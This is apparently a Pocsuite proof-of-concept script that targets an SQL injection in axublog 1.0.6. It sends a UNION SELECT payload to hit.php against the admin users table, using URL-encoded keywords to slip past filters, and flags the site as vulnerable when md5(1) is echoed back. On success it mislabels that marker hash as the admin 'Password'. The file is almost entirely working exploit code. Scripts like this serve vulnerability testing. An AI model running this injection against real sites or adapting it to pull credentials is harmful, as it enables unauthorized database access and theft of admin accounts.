#!/usr/bin/python
# -*- coding: utf-8 -*-


from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class AxublogPOC(POCBase):
    name = 'axublog'
    vulID = '0'  # https://www.seebug.org/vuldb/ssvid-78176
    author = ['bey0nd']
    vulType = 'SQLI'
    version = '1.0.6'    # default version: 1.0
    references = ['']
    desc = '''axublog1.0.6 sqli'''

    vulDate = '2018-01-10'
    createDate = '2018-01-10'
    updateDate = '2018-01-10'

    appName = 'axublog'
    appVersion = 'axublog'
    appPowerLink = 'axublog'
    samples = ['']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        payurl = "hit.php?g=arthit&id=-1 +%55NION+ALL+%53ELECT+1,2,3,4,5,6,md5(1),8,9,10,11,12 from axublog_adusers"
        resp = req.get(self.url + payurl)
        print resp.text
        if resp and resp.text and resp.status_code == 200:
            if "c4ca4238a0b923820dcc509a6f75849b" in resp.text:
                result['AdminInfo'] = {}
                result['AdminInfo']['Password'] = "c4ca4238a0b923820dcc509a6f75849b"
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Failed')
        return output

register(AxublogPOC)
